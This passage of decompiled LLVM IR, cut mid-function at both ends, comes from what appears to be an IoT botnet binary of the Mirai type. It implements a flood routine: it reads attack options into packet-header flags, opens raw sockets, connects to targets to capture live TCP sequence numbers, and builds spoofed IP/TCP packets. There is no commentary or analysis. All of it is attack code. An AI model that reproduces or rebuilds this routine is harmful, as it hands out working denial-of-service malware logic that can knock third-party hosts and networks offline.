  %v5_99dc = inttoptr i32 %v0_99c4 to i32*
  %v6_99dc = call i32 @attack_get_opt_int(i32 %v0_99d4, i32* %v5_99dc, i32 11, i32 1, i32 ptrtoint (i32* @0 to i32))
  %v1_99e4 = urem i32 %v6_99dc, 256
  store i32 %v1_99e4, i32* %ip.global-to-local, align 4
  %v0_99e8 = load i32, i32* @r5, align 4
  store i32 %v0_99e8, i32* %r1.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_99f4 = load i32, i32* @r4, align 4
  store i32 %v0_99f4, i32* %r0.global-to-local, align 4
  %v5_99fc = inttoptr i32 %v0_99e8 to i32*
  %v6_99fc = call i32 @attack_get_opt_int(i32 %v0_99f4, i32* %v5_99fc, i32 12, i32 1, i32 %v1_99e4)
  %v1_9a04 = urem i32 %v6_99fc, 256
  store i32 %v1_9a04, i32* %ip.global-to-local, align 4
  %v0_9a08 = load i32, i32* @r5, align 4
  store i32 %v0_9a08, i32* %r1.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_9a14 = load i32, i32* @r4, align 4
  store i32 %v0_9a14, i32* %r0.global-to-local, align 4
  %v5_9a1c = inttoptr i32 %v0_9a08 to i32*
  %v6_9a1c = call i32 @attack_get_opt_int(i32 %v0_9a14, i32* %v5_9a1c, i32 13, i32 1, i32 %v1_9a04)
  %v1_9a24 = urem i32 %v6_9a1c, 256
  store i32 %v1_9a24, i32* %ip.global-to-local, align 4
  %v0_9a28 = load i32, i32* @r5, align 4
  store i32 %v0_9a28, i32* %r1.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_9a34 = load i32, i32* @r4, align 4
  store i32 %v0_9a34, i32* %r0.global-to-local, align 4
  %v5_9a3c = inttoptr i32 %v0_9a28 to i32*
  %v6_9a3c = call i32 @attack_get_opt_int(i32 %v0_9a34, i32* %v5_9a3c, i32 14, i32 1, i32 %v1_9a24)
  %v1_9a44 = urem i32 %v6_9a3c, 256
  store i32 %v1_9a44, i32* %ip.global-to-local, align 4
  %v0_9a48 = load i32, i32* @r5, align 4
  store i32 %v0_9a48, i32* %r1.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_9a54 = load i32, i32* @r4, align 4
  store i32 %v0_9a54, i32* %r0.global-to-local, align 4
  %v5_9a5c = inttoptr i32 %v0_9a48 to i32*
  %v6_9a5c = call i32 @attack_get_opt_int(i32 %v0_9a54, i32* %v5_9a5c, i32 15, i32 1, i32 %v1_9a44)
  %v1_9a64 = urem i32 %v6_9a5c, 256
  store i32 %v1_9a64, i32* %ip.global-to-local, align 4
  %v0_9a68 = load i32, i32* @r5, align 4
  store i32 %v0_9a68, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_9a74 = load i32, i32* @r4, align 4
  store i32 %v0_9a74, i32* %r0.global-to-local, align 4
  %v5_9a7c = inttoptr i32 %v0_9a68 to i32*
  %v6_9a7c = call i32 @attack_get_opt_int(i32 %v0_9a74, i32* %v5_9a7c, i32 16, i32 1, i32 %v1_9a64)
  %v1_9a84 = urem i32 %v6_9a7c, 256
  store i32 %v1_9a84, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 768, i32* %r3.global-to-local, align 4
  %v0_9a90 = load i32, i32* @r5, align 4
  store i32 %v0_9a90, i32* %r1.global-to-local, align 4
  %v0_9a94 = load i32, i32* @r4, align 4
  store i32 %v0_9a94, i32* %r0.global-to-local, align 4
  %v5_9a9c = inttoptr i32 %v0_9a90 to i32*
  %v6_9a9c = call i32 @attack_get_opt_int(i32 %v0_9a94, i32* %v5_9a9c, i32 0, i32 768, i32 %v1_9a84)
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_9aac = load i32, i32* @r5, align 4
  store i32 %v0_9aac, i32* %r1.global-to-local, align 4
  %v0_9ab0 = load i32, i32* @r4, align 4
  store i32 %v0_9ab0, i32* %r0.global-to-local, align 4
  %v5_9ab4 = inttoptr i32 %v0_9aac to i32*
  %v6_9ab4 = call i32 @attack_get_opt_int(i32 %v0_9ab0, i32* %v5_9ab4, i32 1, i32 1, i32 ptrtoint (i32* @0 to i32))
  %v1_9abc = urem i32 %v6_9ab4, 256
  store i32 %v1_9abc, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v3_9ad0 = call i32 @socket(i32 2, i32 3, i32 6)
  store i32 %v3_9ad0, i32* %r0.global-to-local, align 4
  %v7_9ad4 = icmp eq i32 %v3_9ad0, -1
  store i1 %v7_9ad4, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_9ad0, i32* @sb, align 4
  br i1 %v7_9ad4, label %dec_label_pc_9cc4, label %dec_label_pc_9ae0

dec_label_pc_9ae0:                                ; preds = %entry
  store i32 1, i32* %stack_var_-44, align 4
  %v6_9ae8 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_9ae8, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_9afc = call i32 @__GI_setsockopt(i32 %v3_9ad0, i32 0, i32 3, i32 %v6_9ae8, i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_9afc, i32* %r0.global-to-local, align 4
  %v7_9b00 = icmp eq i32 %v5_9afc, -1
  store i1 %v7_9b00, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9b00, label %dec_label_pc_9cbc, label %dec_label_pc_9b08

dec_label_pc_9b08:                                ; preds = %dec_label_pc_9ae0
  %v0_9b08 = load i32, i32* @r7, align 4
  %v3_9b08 = mul i32 %v0_9b08, 65536
  store i32 %v3_9b08, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r3, align 4
  %v0_9b10 = load i32, i32* @r6, align 4
  %v2_9b10 = icmp eq i32 %v0_9b10, 0
  store i1 %v2_9b10, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  %v3_9b18 = urem i32 %v0_9b08, 65536
  store i32 %v3_9b18, i32* @fp, align 4
  br i1 %v2_9b10, label %dec_label_pc_9f48, label %dec_label_pc_9b20.preheader

dec_label_pc_9b20.preheader:                      ; preds = %dec_label_pc_9b08
  %v2_9b6c = ptrtoint i32* %stack_var_-144 to i32
  %v2_9bb0 = ptrtoint i32* %stack_var_-64 to i32
  %v2_9be8 = ptrtoint i32* %stack_var_-80 to i32
  %v2_9bf4 = ptrtoint i32* %stack_var_-336 to i32
  %v2_9bf8 = ptrtoint i32* %stack_var_-48 to i32
  %v4_9c58 = zext i8 %tmp to i32
  %v1_9c5c = and i32 %v4_9c58, 18
  %v2_9c60 = icmp eq i32 %v1_9c5c, 18
  %v3_9c44 = sext i16 %tmp61 to i32
  %v1_9c68 = and i32 %v4_9c58, 5
  %v2_9c68 = icmp eq i32 %v1_9c68, 0
  %v4_9ba8 = add i32 %v2_9b6c, 82
  %v5_9ba8 = inttoptr i32 %v4_9ba8 to i16*
  %v1_9d98 = add i32 %v6_9a9c, 40
  %v1_9eac = urem i32 %v6_99dc, 2
  %tmp97 = sub nsw i32 0, %v1_9eac
  %v4_9eb4 = and i32 %tmp97, 32
  %v1_9ec4 = urem i32 %v6_99fc, 2
  %tmp98 = sub nsw i32 0, %v1_9ec4
  %v4_9ecc = and i32 %tmp98, 16
  %v1_9edc = urem i32 %v6_9a1c, 2
  %tmp99 = sub nsw i32 0, %v1_9edc
  %v4_9ee4 = and i32 %tmp99, 8
  %v1_9ef4 = urem i32 %v6_9a3c, 2
  %tmp100 = sub nsw i32 0, %v1_9ef4
  %v4_9efc = and i32 %tmp100, 4
  %v1_9f0c = urem i32 %v6_9a5c, 2
  %tmp101 = sub nsw i32 0, %v1_9f0c
  %v3_9f14 = and i32 %tmp101, 2
  %v1_9f24 = urem i32 %v6_9a7c, 2
  br label %dec_label_pc_9b20

dec_label_pc_9b20:                                ; preds = %dec_label_pc_9b20.preheader, %dec_label_pc_9c94
  %stack_var_-62.0 = phi i16 [ %stack_var_-62.3, %dec_label_pc_9c94 ], [ %tmp34, %dec_label_pc_9b20.preheader ]
  %stack_var_-60.0 = phi i32 [ %stack_var_-60.4, %dec_label_pc_9c94 ], [ %tmp37, %dec_label_pc_9b20.preheader ]
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_9b2c = call i32 @socket(i32 2, i32 1, i32 0)
  store i32 %v3_9b2c, i32* %r0.global-to-local, align 4
  %v7_9b30 = icmp eq i32 %v3_9b2c, -1
  store i1 %v7_9b30, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_9b2c, i32* @r5, align 4
  br i1 %v7_9b30, label %dec_label_pc_9c94, label %dec_label_pc_9b3c

dec_label_pc_9b3c:                                ; preds = %dec_label_pc_9b20, %dec_label_pc_9c70
  %v0_9b44 = phi i32 [ %v3_9c84, %dec_label_pc_9c70 ], [ %v3_9b2c, %dec_label_pc_9b20 ]
  %stack_var_-62.1 = phi i16 [ %stack_var_-62.2, %dec_label_pc_9c70 ], [ %stack_var_-62.0, %dec_label_pc_9b20 ]
  %stack_var_-60.1 = phi i32 [ %v0_9d44, %dec_label_pc_9c70 ], [ %stack_var_-60.0, %dec_label_pc_9b20 ]
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 0, i32* @r2, align 4
  %v2_9b44 = call i32 @__libc_fcntl(i32 %v0_9b44, i32 3)
  store i32 4, i32* %r1.global-to-local, align 4
  %v1_9b4c = or i32 %v2_9b44, 2048
  store i32 %v1_9b4c, i32* @r2, align 4
  %v0_9b50 = load i32, i32* @r5, align 4
  store i32 %v0_9b50, i32* %r0.global-to-local, align 4
  %v2_9b54 = call i32 @__libc_fcntl(i32 %v0_9b50, i32 4)
  %v3_9b58 = load i32, i32* %stack_var_-44, align 4
  %v5_9b60 = mul i32 %v3_9b58, 24
  store i32 2, i32* %r1.global-to-local, align 4
  store i32 %arg2, i32* %r2.global-to-local, align 4
  store i32 %v2_9b6c, i32* %r0.global-to-local, align 4
  store i32 2, i32* %stack_var_-64, align 4
  %v2_9b74 = add i32 %v5_9b60, %arg2
  store i32 %v2_9b74, i32* %r3.global-to-local, align 4
  %v1_9b78 = add i32 %v2_9b74, 20
  %v2_9b78 = inttoptr i32 %v1_9b78 to i8*
  %v3_9b78 = load i8, i8* %v2_9b78, align 1
  %v4_9b78 = zext i8 %v3_9b78 to i32
  store i32 %v4_9b78, i32* %r2.global-to-local, align 4
  %v2_9b7c = icmp ugt i8 %v3_9b78, 30
  %v7_9b7c = icmp eq i8 %v3_9b78, 31
  store i1 %v7_9b7c, i1* %cpsr_z.global-to-local, align 1
  %v2_9b80 = xor i1 %v7_9b7c, true
  %v3_9b80 = and i1 %v2_9b7c, %v2_9b80
  br i1 %v3_9b80, label %bb, label %bb71

bb:                                               ; preds = %dec_label_pc_9b3c
  %v5_9b80 = add i32 %v2_9b74, 16
  %v6_9b80 = inttoptr i32 %v5_9b80 to i32*
  %v7_9b80 = load i32, i32* %v6_9b80, align 4
  store i32 %v7_9b80, i32* %r3.global-to-local, align 4
  br label %bb71

bb71:                                             ; preds = %dec_label_pc_9b3c, %bb
  %v4_9b84 = phi i32 [ %v2_9b74, %dec_label_pc_9b3c ], [ %v7_9b80, %bb ]
  %v4_9b84.stack_var_-60.1 = select i1 %v3_9b80, i32 %v4_9b84, i32 %stack_var_-60.1
  %v2_9b88 = xor i1 %v2_9b7c, true
  %v3_9b88 = or i1 %v7_9b7c, %v2_9b88
  br i1 %v3_9b88, label %dec_label_pc_9cd0, label %dec_label_pc_9b8c

dec_label_pc_9b8c:                                ; preds = %bb71, %dec_label_pc_9cd0
  %v0_9d44 = phi i32 [ %v5_9d20, %dec_label_pc_9cd0 ], [ %v4_9b84.stack_var_-60.1, %bb71 ]
  store i32 65535, i32* %r3.global-to-local, align 4
  %v0_9b94 = load i32, i32* @sl, align 4
  %v9_9b94 = icmp eq i32 %v0_9b94, 65535
  store i1 %v9_9b94, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_9b94, label %dec_label_pc_9d2c, label %.thread9

.thread9:                                         ; preds = %dec_label_pc_9b8c
  %v4_9b98 = udiv i32 %v0_9b94, 256
  %v2_9b9c = urem i32 %v0_9b94, 256
  store i32 %v2_9b9c, i32* %r2.global-to-local, align 4
  %v5_9ba0 = mul nuw nsw i32 %v2_9b9c, 256
  %v6_9ba0 = or i32 %v5_9ba0, %v4_9b98
  store i32 %v6_9ba0, i32* %r3.global-to-local, align 4
  store i32 %v2_9b6c, i32* %r0.global-to-local, align 4
  %v2_9ba8 = trunc i32 %v6_9ba0 to i16
  store i16 %v2_9ba8, i16* %v5_9ba8, align 2
  br label %dec_label_pc_9bb0

dec_label_pc_9bb0:                                ; preds = %.thread9, %dec_label_pc_9d2c
  %stack_var_-62.2 = phi i16 [ %v1_9d2c, %dec_label_pc_9d2c ], [ %stack_var_-62.1, %.thread9 ]
  store i32 %v2_9bb0, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v0_9bb8 = load i32, i32* @r5, align 4
  store i32 %v0_9bb8, i32* %r0.global-to-local, align 4
  %v3_9bbc = call i32 @__libc_connect(i32 %v0_9bb8, i32 %v2_9bb0, i32 16)
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_9bc4 = call i32 @__GI_time(i32* null)
  store i32 %v2_9bc4, i32* %r0.global-to-local, align 4
  store i32 %v2_9bc4, i32* @r4, align 4
  %v9_9c24 = icmp eq i32 %tmp35, %v0_9d44
  %v4_9c4c = zext i16 %stack_var_-62.2 to i32
  %. = zext i1 %v9_9c24 to i32
  %v9_9c38 = icmp eq i1 %v9_9c24, false
  %v9_9c50 = icmp eq i32 %v3_9c44, %v4_9c4c
  br label %dec_label_pc_9be0

dec_label_pc_9bd0:                                ; preds = %.thread, %dec_label_pc_9c40, %dec_label_pc_9c68, %bb75
  %v2_9bd0 = call i32 @__GI_time(i32* null)
  %v0_9bd4 = load i32, i32* @r4, align 4
  %v2_9bd4 = sub i32 %v2_9bd0, %v0_9bd4
  store i32 %v2_9bd4, i32* %r0.global-to-local, align 4
  %v7_9bd8 = icmp eq i32 %v2_9bd4, 10
  store i1 %v7_9bd8, i1* %cpsr_z.global-to-local, align 1
  %v8_9bdc = icmp sgt i32 %v2_9bd4, 10
  br i1 %v8_9bdc, label %dec_label_pc_9c70, label %dec_label_pc_9be0

dec_label_pc_9be0:                                ; preds = %dec_label_pc_9bd0, %dec_label_pc_9bb0
  store i32 16, i32* %stack_var_-48, align 4
  store i32 256, i32* %r2.global-to-local, align 4
  store i32 %v2_9bf4, i32* %r1.global-to-local, align 4
  store i32 %v2_9bf8, i32* %ip.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_9c00 = load i32, i32* @sb, align 4
  store i32 %v0_9c00, i32* %r0.global-to-local, align 4
  %v6_9c08 = call i32 @__libc_recvfrom(i32 %v0_9c00, i32 %v2_9bf4, i32 256, i32 16384, i32 %v2_9be8, i32 %v2_9bf8)
  store i32 %v6_9c08, i32* %r2.global-to-local, align 4
  %v7_9c10 = icmp eq i32 %v6_9c08, -1
  store i1 %v7_9c10, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r0.global-to-local, align 4
  br i1 %v7_9c10, label %dec_label_pc_9cc4, label %dec_label_pc_9c1c

dec_label_pc_9c1c:                                ; preds = %dec_label_pc_9be0
  store i32 %v0_9d44, i32* @r1, align 4
  store i32 %tmp35, i32* @r3, align 4
  store i32 %., i32* %ip.global-to-local, align 4
  %v7_9c30 = icmp eq i32 %v6_9c08, 40
  store i1 %v7_9c30, i1* %cpsr_z.global-to-local, align 1
  %tmp102 = icmp ult i32 %v6_9c08, 41
  br i1 %tmp102, label %.thread, label %bb75

.thread:                                          ; preds = %dec_label_pc_9c1c
  store i32 0, i32* %ip.global-to-local, align 4
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_9bd0

bb75:                                             ; preds = %dec_label_pc_9c1c
  store i1 %v9_9c38, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_9c38, label %dec_label_pc_9bd0, label %dec_label_pc_9c40

dec_label_pc_9c40:                                ; preds = %bb75
  store i32 %v3_9c44, i32* @lr, align 4
  store i32 %v2_9b6c, i32* @r3, align 4
  store i32 %v4_9c4c, i32* %r2.global-to-local, align 4
  store i1 %v9_9c50, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_9c50, label %dec_label_pc_9c58, label %dec_label_pc_9bd0

dec_label_pc_9c58:                                ; preds = %dec_label_pc_9c40
  store i32 %v4_9c58, i32* %r2.global-to-local, align 4
  store i32 %v1_9c5c, i32* @r3, align 4
  store i1 %v2_9c60, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_9c60, label %dec_label_pc_9d3c, label %dec_label_pc_9c68

dec_label_pc_9c68:                                ; preds = %dec_label_pc_9c58
  store i1 %v2_9c68, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_9c68, label %dec_label_pc_9bd0, label %dec_label_pc_9c70

dec_label_pc_9c70:                                ; preds = %dec_label_pc_9c68, %dec_label_pc_9bd0
  %v0_9c70 = load i32, i32* @r5, align 4
  store i32 %v0_9c70, i32* %r0.global-to-local, align 4
  %v1_9c74 = call i32 @__GI___libc_close(i32 %v0_9c70)
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_9c84 = call i32 @socket(i32 2, i32 1, i32 0)
  store i32 %v3_9c84, i32* %r0.global-to-local, align 4
  %v3_9c88 = icmp eq i32 %v3_9c84, -1
  %v8_9c88 = icmp eq i32 %v3_9c84, -1
  store i1 %v8_9c88, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_9c84, i32* @r5, align 4
  br i1 %v3_9c88, label %dec_label_pc_9c94, label %dec_label_pc_9b3c

dec_label_pc_9c94:                                ; preds = %dec_label_pc_9c70, %dec_label_pc_9b20, %bb82
  %stack_var_-62.3 = phi i16 [ %stack_var_-62.0, %dec_label_pc_9b20 ], [ %stack_var_-62.2, %bb82 ], [ %stack_var_-62.2, %dec_label_pc_9c70 ]
  %stack_var_-60.4 = phi i32 [ %stack_var_-60.0, %dec_label_pc_9b20 ], [ %v0_9d44, %bb82 ], [ %v0_9d44, %dec_label_pc_9c70 ]
  %v3_9c94 = load i32, i32* %stack_var_-44, align 4
  %v1_9c98 = add i32 %v3_9c94, 1
  store i32 %v1_9c98, i32* @r3, align 4
  %v1_9c9c = load i32, i32* @r6, align 4
  %v9_9c9c = icmp eq i32 %v1_9c98, %v1_9c9c
  store i1 %v9_9c9c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_9c98, i32* %stack_var_-44, align 4
  %v5_9ca4 = icmp slt i32 %v1_9c98, %v1_9c9c
  br i1 %v5_9ca4, label %dec_label_pc_9b20, label %dec_label_pc_9ca8

dec_label_pc_9ca8:                                ; preds = %dec_label_pc_9c94
  store i32 %v6_9a9c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9f58

dec_label_pc_9cbc:                                ; preds = %dec_label_pc_9ae0
  %v0_9cbc = load i32, i32* @sb, align 4
  store i32 %v0_9cbc, i32* %r0.global-to-local, align 4
  %v1_9cc0 = call i32 @__GI___libc_close(i32 %v0_9cbc)
  store i32 %v1_9cc0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9cc4

dec_label_pc_9cc4:                                ; preds = %dec_label_pc_9be0, %entry, %dec_label_pc_9cbc
  %v1_9ccc = phi i32 [ %v3_9ad0, %entry ], [ %v1_9cc0, %dec_label_pc_9cbc ], [ 0, %dec_label_pc_9be0 ]
  store i32 %v27_98fc, i32* %lr.global-to-local, align 4
  ret i32 %v1_9ccc

dec_label_pc_9cd0:                                ; preds = %bb71
  %v1_9cd0 = add i32 %v4_9b84, 16
  %v2_9cd0 = inttoptr i32 %v1_9cd0 to i32*
  %v3_9cd0 = load i32, i32* %v2_9cd0, align 4
  store i32 %v3_9cd0, i32* @r4, align 4
  %v0_9cd4 = call i32 @rand_next()
  store i32 %v0_9cd4, i32* %r0.global-to-local, align 4
  %v3_9cd8 = load i32, i32* %stack_var_-44, align 4
  %v5_9ce0 = mul i32 %v3_9cd8, 24
  %v0_9ce8 = load i32, i32* @r4, align 4
  %v1_9ce8 = and i32 %v0_9ce8, 16711680
  store i32 %v1_9ce8, i32* %ip.global-to-local, align 4
  %v3_9cec = udiv i32 %v0_9ce8, 16777216
  %v2_9cf0 = add i32 %v5_9ce0, %arg2
  store i32 %v2_9cf0, i32* %r1.global-to-local, align 4
  %v4_9cf4 = udiv i32 %v1_9ce8, 256
  %v5_9cf4 = or i32 %v4_9cf4, %v3_9cec
  store i32 %v5_9cf4, i32* %r2.global-to-local, align 4
  %v1_9cf8 = and i32 %v0_9ce8, 65280
  store i32 %v1_9cf8, i32* %r3.global-to-local, align 4
  %v1_9cfc = add i32 %v2_9cf0, 20
  %v2_9cfc = inttoptr i32 %v1_9cfc to i8*
  %v3_9cfc = load i8, i8* %v2_9cfc, align 1
  %v4_9cfc = zext i8 %v3_9cfc to i32
  store i32 %v4_9cfc, i32* %ip.global-to-local, align 4
  %v5_9d04 = call i32 @llvm.bswap.i32(i32 %v0_9ce8)
  %v7_9d08 = lshr i32 %v0_9cd4, %v4_9cfc
  %v8_9d08 = add i32 %v7_9d08, %v5_9d04
  store i32 %v8_9d08, i32* %r2.global-to-local, align 4
  %v1_9d0c = and i32 %v8_9d08, 16711680
  store i32 %v1_9d0c, i32* %r0.global-to-local, align 4
  %v1_9d18 = and i32 %v8_9d08, 65280
  store i32 %v1_9d18, i32* %r1.global-to-local, align 4
  %v5_9d20 = call i32 @llvm.bswap.i32(i32 %v8_9d08)
  store i32 %v5_9d20, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_9b8c

dec_label_pc_9d2c:                                ; preds = %dec_label_pc_9b8c
  %v0_9d2c = call i32 @rand_next()
  %v1_9d2c = trunc i32 %v0_9d2c to i16
  store i32 %v0_9d2c, i32* %r0.global-to-local, align 4
  store i32 %v2_9b6c, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_9bb0

dec_label_pc_9d3c:                                ; preds = %dec_label_pc_9c58
  %v3_9d3c = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_9d3c, i32* @r4, align 4
  store i32 %v2_9918, i32* %ip.global-to-local, align 4
  %v5_9d44 = mul i32 %v3_9d3c, 16
  %v6_9d44 = add i32 %v5_9d44, %v2_9918
  %v7_9d44 = inttoptr i32 %v6_9d44 to i32*
  store i32 %v0_9d44, i32* %v7_9d44, align 4
  %v0_9d48 = load i32, i32* @r8, align 4
  %v1_9d48 = add i32 %v0_9d48, 4
  %v2_9d48 = inttoptr i32 %v1_9d48 to i32*
  %v3_9d48 = load i32, i32* %v2_9d48, align 4
  store i32 %v3_9d48, i32* %r1.global-to-local, align 4
  %v1_9d54 = and i32 %v3_9d48, 65280
  store i32 %v1_9d54, i32* %r2.global-to-local, align 4
  store i32 %v2_9918, i32* %r0.global-to-local, align 4
  %v0_9d64 = load i32, i32* @r4, align 4
  %v3_9d64 = mul i32 %v0_9d64, 16
  %v2_9d68 = add i32 %v3_9d64, %v2_9918
  store i32 %v2_9d68, i32* %ip.global-to-local, align 4
  %v5_9d6c = call i32 @llvm.bswap.i32(i32 %v3_9d48)
  store i32 %v5_9d6c, i32* %r3.global-to-local, align 4
  %v2_9d70 = add i32 %v2_9d68, 4
  %v3_9d70 = inttoptr i32 %v2_9d70 to i32*
  store i32 %v5_9d6c, i32* %v3_9d70, align 4
  %v0_9d74 = load i32, i32* @r8, align 4
  %v1_9d74 = add i32 %v0_9d74, 8
  %v2_9d74 = inttoptr i32 %v1_9d74 to i32*
  %v3_9d74 = load i32, i32* %v2_9d74, align 4
  store i32 %v3_9d74, i32* %r1.global-to-local, align 4
  %v1_9d78 = and i32 %v3_9d74, 16711680
  store i32 %v1_9d78, i32* %r0.global-to-local, align 4
  store i32 %v6_9a9c, i32* %r2.global-to-local, align 4
  %v5_9d90 = call i32 @llvm.bswap.i32(i32 %v3_9d74)
  store i32 %v5_9d90, i32* %r3.global-to-local, align 4
  %v1_9d94 = add i32 %v0_9d74, 2
  %v2_9d94 = inttoptr i32 %v1_9d94 to i16*
  %v3_9d94 = load i16, i16* %v2_9d94, align 2
  %v4_9d94 = zext i16 %v3_9d94 to i32
  store i32 %v4_9d94, i32* %r1.global-to-local, align 4
  store i32 %v1_9d98, i32* @r7, align 4
  %v0_9d9c = load i32, i32* @lr, align 4
  %v1_9d9c = trunc i32 %v0_9d9c to i16
  %v2_9d9c = load i32, i32* %ip.global-to-local, align 4
  %v3_9d9c = add i32 %v2_9d9c, 14
  %v4_9d9c = inttoptr i32 %v3_9d9c to i16*
  store i16 %v1_9d9c, i16* %v4_9d9c, align 2
  %v0_9da0 = load i32, i32* %r1.global-to-local, align 4
  %v1_9da0 = trunc i32 %v0_9da0 to i16
  %v2_9da0 = load i32, i32* %ip.global-to-local, align 4
  %v3_9da0 = add i32 %v2_9da0, 12
  %v4_9da0 = inttoptr i32 %v3_9da0 to i16*
  store i16 %v1_9da0, i16* %v4_9da0, align 2
  %v0_9da4 = load i32, i32* %r3.global-to-local, align 4
  %v1_9da4 = load i32, i32* %ip.global-to-local, align 4
  %v2_9da4 = add i32 %v1_9da4, 8
  %v3_9da4 = inttoptr i32 %v2_9da4 to i32*
  store i32 %v0_9da4, i32* %v3_9da4, align 4
  %v0_9da8 = load i32, i32* @r7, align 4
  store i32 %v0_9da8, i32* @r0, align 4
  %v0_9dac = call i32 @malloc()
  store i32 %v0_9dac, i32* %r0.global-to-local, align 4
  store i32 %v2_9928, i32* %r3.global-to-local, align 4
  %v2_9db8 = load i32, i32* @r4, align 4
  %v5_9db8 = mul i32 %v2_9db8, 4
  %v6_9db8 = add i32 %v5_9db8, %v2_9928
  %v7_9db8 = inttoptr i32 %v6_9db8 to i32*
  store i32 %v0_9dac, i32* %v7_9db8, align 4
  %v3_9dbc = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_9dbc, i32* %r2.global-to-local, align 4
  %v0_9dc0 = load i32, i32* %r3.global-to-local, align 4
  %v4_9dc0 = mul i32 %v3_9dbc, 4
  %v5_9dc0 = add i32 %v0_9dc0, %v4_9dc0
  %v6_9dc0 = inttoptr i32 %v5_9dc0 to i32*
  %v7_9dc0 = load i32, i32* %v6_9dc0, align 4
  store i32 %v7_9dc0, i32* @r4, align 4
  %v1_9dc4 = inttoptr i32 %v7_9dc0 to i8*
  %v2_9dc4 = load i8, i8* %v1_9dc4, align 1
  %tmp103 = urem i8 %v2_9dc4, 16
  %v1_9dc8 = zext i8 %tmp103 to i32
  %v1_9dcc = or i32 %v1_9dc8, 64
  store i32 %v1_9dcc, i32* %r3.global-to-local, align 4
  %v1_9dd0 = trunc i32 %v1_9dcc to i8
  store i8 %v1_9dd0, i8* %v1_9dc4, align 1
  %v0_9dd4 = load i32, i32* @r4, align 4
  %v1_9dd4 = inttoptr i32 %v0_9dd4 to i8*
  %v2_9dd4 = load i8, i8* %v1_9dd4, align 1
  %v0_9dd8 = load i32, i32* @r7, align 4
  %tmp77 = mul i32 %v0_9dd8, 256
  %v1_9de0 = and i8 %v2_9dd4, -16
  %v1_9de4 = or i8 %v1_9de0, 5
  %v1_9de8 = and i32 %tmp77, 65280
  %tmp78 = udiv i32 %v0_9dd8, 256
  %v4_9dec = urem i32 %tmp78, 256
  %v5_9dec = or i32 %v4_9dec, %v1_9de8
  store i32 %v5_9dec, i32* %r2.global-to-local, align 4
  %v0_9df0 = load i32, i32* @fp, align 4
  %v1_9df0 = urem i32 %v0_9df0, 256
  store i32 %v1_9df0, i32* %r0.global-to-local, align 4
  store i32 %v1_99a8, i32* %ip.global-to-local, align 4
  %v3_9df8 = udiv i32 %v0_9df0, 256
  store i32 %v3_9df8, i32* %r1.global-to-local, align 4
  store i8 %v1_9de4, i8* %v1_9dd4, align 1
  %v0_9e00 = load i32, i32* %r1.global-to-local, align 4
  %v1_9e00 = load i32, i32* %r0.global-to-local, align 4
  %v4_9e00 = mul i32 %v1_9e00, 256
  %v5_9e00 = or i32 %v4_9e00, %v0_9e00
  store i32 %v5_9e00, i32* %r1.global-to-local, align 4
  store i32 %v6_9940, i32* %r0.global-to-local, align 4
  %v2_9e08 = load i32, i32* @r4, align 4
  %v3_9e08 = add i32 %v2_9e08, 1
  %v4_9e08 = inttoptr i32 %v3_9e08 to i8*
  store i8 %v5_9960, i8* %v4_9e08, align 1
  %v0_9e0c = load i32, i32* %r1.global-to-local, align 4
  %v1_9e0c = trunc i32 %v0_9e0c to i16
  %v2_9e0c = load i32, i32* @r4, align 4
  %v3_9e0c = add i32 %v2_9e0c, 4
  %v4_9e0c = inttoptr i32 %v3_9e0c to i16*
  store i16 %v1_9e0c, i16* %v4_9e0c, align 2
  %v0_9e10 = load i32, i32* %ip.global-to-local, align 4
  %v2_9e10 = icmp eq i32 %v0_9e10, 0
  store i1 %v2_9e10, i1* %cpsr_z.global-to-local, align 1
  store i32 %v5_999c, i32* %r1.global-to-local, align 4
